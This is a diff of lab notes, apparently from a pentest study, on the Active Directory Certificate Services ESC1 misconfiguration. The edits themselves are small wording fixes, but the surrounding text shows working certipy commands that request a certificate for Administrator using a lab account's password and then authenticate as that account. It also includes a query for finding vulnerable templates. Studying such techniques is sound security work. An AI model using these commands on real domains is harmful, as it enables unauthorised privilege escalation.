@@ -4,7 +4,7 @@
 
 ------
 
-Vulernability lies in the possibility to specify an alternate user in the certificate request. If the certificate templates allows including a `subjectAltName` (`SAN`) from another use than from the user making the ceritificate request, we can use any user.
+Vulernability lies in the possibility to specify an alternate user in the certificate request. If the certificate templates allows including a `subjectAltName` (`SAN`) from another use than from the user making the ceritificate request, we can use any user here.
 
 ```bash
 # Find vulnerabilities
@@ -23,7 +23,7 @@ To abuse the ESC1 template we can use certipy to request a Certificate and inclu
 certipy req -u 'zen@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -ca lab-LAB-DC-CA -template ESC1 -upn Administrator
 ```
 
-**Authenticate with certificate and get a TGT**
+**Authenticate with certificate and get a TGT**.
 
 ```bash
 certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.205.199
@@ -58,7 +58,7 @@ Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollm
 
 ### Concluding
 
-ESC 1 misconfiguratin is specifying an alternate user in the certificate request by alloowing to including a `subjectAltName` (`SAN)` .&#x20;
+The ESC 1 misconfiguration is specifying an alternate user in the certificate request by alloowing to including a `subjectAltName` (`SAN)` .&#x20;
 
 **What makes it vulnerable to ESC1?**
 
